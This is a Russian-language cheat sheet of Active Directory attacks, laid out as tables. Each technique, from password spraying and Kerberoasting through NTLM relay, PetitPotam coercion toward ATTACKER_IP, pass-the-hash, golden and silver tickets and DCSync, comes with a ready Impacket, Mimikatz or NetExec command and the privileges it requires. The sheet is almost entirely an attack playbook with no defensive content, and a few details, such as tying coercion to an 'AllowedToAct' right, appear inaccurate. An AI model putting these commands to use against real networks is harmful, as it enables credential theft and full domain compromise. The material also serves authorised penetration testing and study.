# ПОЛНАЯ СРАВНИТЕЛЬНАЯ ТАБЛИЦА АТАК НА ACTIVE DIRECTORY (ОДНА ТАБЛИЦА)

| Атака | Что используем | Где взять / как получить | Команда / Инструмент | Применение | Нужны права |
|-------|----------------|--------------------------|---------------------|------------|-------------|
| **Password Spraying** | Один пароль на много пользователей | Словарь паролей (rockyou.txt, seclists) | `nxc smb DC_IP -u users.txt -p 'Password123!'` | Найти первую валидную учетку | Не нужны |
| **Kerberoasting** | TGS билет сервисной учетки | SPN в AD (можно найти через BloodHound или GetUserSPNs) | `GetUserSPNs.py DOMAIN/user:pass@DC_IP -request` | Взлом хэша → пароль сервисной учетки | Любой доменный пользователь |
| **AS-REP Roasting** | AS-REP билет пользователя без pre-auth | Пользователи с флагом `UF_DONT_REQUIRE_PREAUTH` | `GetNPUsers.py DOMAIN/ -dc-ip DC_IP -usersfile users.txt` | Взлом хэша → пароль пользователя | Не нужны (анонимно) |
| **LLMNR/NBT-NS Poisoning** | Ответы на широковещательные запросы | Включенные LLMNR/NBT-NS в сети | `responder -I eth0 -v` | Перехват NTLMv2 хэшей пользователей | Доступ к сети (без учетки) |
| **NTLM Relay** | NTLMv2 хэш (ретрансляция) | Перехват аутентификации (Responder, coercion) | `ntlmrelayx.py -t ldap://DC_IP --escalate-user` | Добавление пользователя в группу Admin | Доступ к сети (без учетки) |
| **Coercion (PetitPotam, PrinterBug)** | Принудительная аутентификация DC | Право `AllowedToAct` или уязвимость | `python3 PetitPotam.py -d DOMAIN -u user -p pass ATTACKER_IP DC_IP` | Заставить DC аутентифицироваться на атакующего | Не нужны (иногда нужна учетка) |
| **Pass-the-Hash** | NTLM хэш | `lsadump::sam` (локальные) или `sekurlsa::msv` (из памяти) | `sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:"cmd.exe"` | Доступ к SMB, WinRM, psexec, RDP без пароля | Локальный администратор (для извлечения) |
| **Pass-the-Ticket** | .kirbi Kerberos билет | `sekurlsa::tickets /export` (из памяти LSASS) | `kerberos::ptt ticket.kirbi` | Доступ к любым Kerberos-сервисам | Локальный администратор (для извлечения) |
| **Overpass-the-Hash** (Pass-the-Key) | RC4/AES ключ | `sekurlsa::ekeys` (из памяти LSASS) | `sekurlsa::pth /user:USER /domain:DOMAIN /rc4:KEY /run:"cmd.exe"` | Запрос TGT → доступ к Kerberos-сервисам | Локальный администратор (для извлечения) |
| **Silver Ticket** | Хэш сервисной учетки (rc4) | `lsadump::lsa /inject /name:ACCOUNT` или из памяти | `kerberos::golden /user:FAKE /domain:DOMAIN /service:cifs /rc4:HASH /ptt` | Доступ к конкретному сервису (например, CIFS на DC) | Domain Admin или хэш сервиса |
| **Golden Ticket** | Хэш krbtgt | `lsadump::lsa /inject /name:krbtgt` или DCSync | `kerberos::golden /user:FAKE /domain:DOMAIN /krbtgt:HASH /ptt` | Полный контроль над всем доменом | Domain Admin (для получения хэша) |
| **DCSync** | Репликация NTDS.dit через сеть | Права `Replicating Directory Changes` | `secretsdump.py DOMAIN/user:pass@DC_IP -just-dc` | Хэши всех пользователей домена | Domain Admin (или спецправа) |
| **Resource-Based Constrained Delegation (RBCD)** | Созданный компьютерный аккаунт | Право на добавление компьютеров в домен | `addcomputer.py -method SAMR` → `rbcd.py` → `getST.py` | Доступ к любой службе на целевой машине | Любой пользователь (10 компьютеров) |
| **Shadow Credentials** | Сертификат на базе ключа | Право на запись атрибутов пользователя | `whisker.py add /target:USER` | Получение TGT пользователя через PKINIT | Право на запись атрибутов |


## ШПАРГАЛКА ПО ИНСТРУМЕНТАМ (ОДНИМ ВЗГЛЯДОМ)

| Инструмент | Для каких атак используется |
|------------|----------------------------|
| **NetExec (nxc)** | Password Spraying, проверка доступов |
| **Impacket (GetUserSPNs.py)** | Kerberoasting |
| **Impacket (GetNPUsers.py)** | AS-REP Roasting |
| **Impacket (secretsdump.py)** | DCSync |
| **Impacket (addcomputer.py, rbcd.py, getST.py)** | RBCD |
| **Mimikatz** | Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, Silver Ticket, Golden Ticket |
| **Rubeus** | Kerberoasting, Pass-the-Ticket (Windows) |
| **Responder** | LLMNR/NBT-NS Poisoning |
| **ntlmrelayx.py** | NTLM Relay |
| **PetitPotam, SpoolSample, DFSCoerce** | Coercion |
| **Whisker, pyWhisker** | Shadow Credentials |


## ТРЕБОВАНИЯ К ПРАВАМ (БЫСТРЫЙ ВЗГЛЯД)

| Уровень доступа | Какие атаки доступны |
|----------------|----------------------|
| **Без учетки / анонимно** | Password Spraying, AS-REP Roasting, LLMNR/NBT-NS, NTLM Relay, Coercion (иногда) |
| **Любой доменный пользователь** | Kerberoasting |
| **Любой пользователь (с правом add computer)** | RBCD |
| **Local Administrator на машине** | Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash (извлечение) |
| **Domain Admin** | Silver Ticket, Golden Ticket, DCSync |